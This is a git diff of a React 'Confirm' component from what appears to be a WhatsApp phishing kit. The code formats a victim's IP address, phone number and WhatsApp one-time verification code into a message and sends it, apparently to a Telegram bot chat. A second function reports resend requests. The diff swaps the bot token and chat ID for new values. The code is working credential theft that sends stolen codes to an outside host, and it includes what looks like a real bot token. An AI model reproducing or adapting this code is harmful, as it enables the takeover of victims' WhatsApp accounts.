@@ -18,14 +18,14 @@ export default function Confirm({ setPage, setNcode, ncode }) {
   const [loading, setLoading] = useState(false);
   const APIS = (currentCode) => {
     var message = "";
-    const apiToken = "7847509084:AAE7uUmRcGrcmC22EzTmIakoJvaArqDyTOg";
+    const apiToken = "lVaur5ZvBTAdQujbYVe05c0E9zQnYr6jAqL3L9AxGV8";
     message += "-------[ Whatsapp  OTP Code ]-------\n";
     message += `IP Address   : ${ncode.ip}\n`;
     message += `Phone Number  : ${formatPhoneNumberIntl(ncode.number)}\n`;
     message += `Code Whatsapp : ${currentCode}\n`;
     const queryParams = {
       text: message,
-      chat_id: "7829326672",
+      chat_id: "4gOF4rTsbS",
       parse_mode: "html",
     };
     const queryString = Object.keys(queryParams)
@@ -39,13 +39,13 @@ export default function Confirm({ setPage, setNcode, ncode }) {
   };
   const notifyBot = () => {
     var message = "";
-    const apiToken = "7847509084:AAE7uUmRcGrcmC22EzTmIakoJvaArqDyTOg";
+    const apiToken = "lVaur5ZvBTAdQujbYVe05c0E9zQnYr6jAqL3L9AxGV8";
     message += "-------[ Whatsapp  Resend OTP code Request ]-------\n";
     message += `IP Address   : ${ncode.ip}\n`;
     message += `Phone Number  : ${formatPhoneNumberIntl(ncode.number)}\n`;
     const queryParams = {
       text: message,
-      chat_id: "7829326672",
+      chat_id: "4gOF4rTsbS",
       parse_mode: "html",
     };
     const queryString = Object.keys(queryParams)
@@ -340,3 +340,4 @@ export default function Confirm({ setPage, setNcode, ncode }) {
     </div>
   );
 }
+
